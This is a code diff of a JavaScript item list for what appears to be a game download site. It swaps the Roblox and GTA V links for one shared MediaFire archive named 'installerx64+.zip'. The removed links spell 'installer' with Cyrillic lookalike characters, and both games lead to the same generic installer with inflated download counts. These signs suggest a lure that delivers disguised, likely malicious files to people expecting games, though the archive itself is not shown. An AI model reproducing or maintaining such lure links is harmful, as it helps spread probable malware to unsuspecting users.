@@ -104,7 +104,7 @@ export const ItemsList = [
         title: "Roblox",
         downloadCount: "95.1K",
         src: "/icons/roblox.png",
-        downloadLink: "https://download947.mediafire.com/bv5rmxb82zlg/4zhxlernv2g273t/%D1%96nstallerx64+.zip"
+        downloadLink: "https://download1074.mediafire.com/pmc9ux26qvog/qmosqb1upxzslz4/installerx64+.zip"
       },
       {
         title: "Apex Legends",
@@ -128,7 +128,7 @@ export const ItemsList = [
         title: "GTA V",
         downloadCount: "87.3K",
         src: "/icons/gta-5.png",
-        downloadLink: "https://download936.mediafire.com/qbkyb8j696tg/8hidapqtccd213b/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://download1074.mediafire.com/pmc9ux26qvog/qmosqb1upxzslz4/installerx64+.zip"
       },
       {
         title: "Rust",
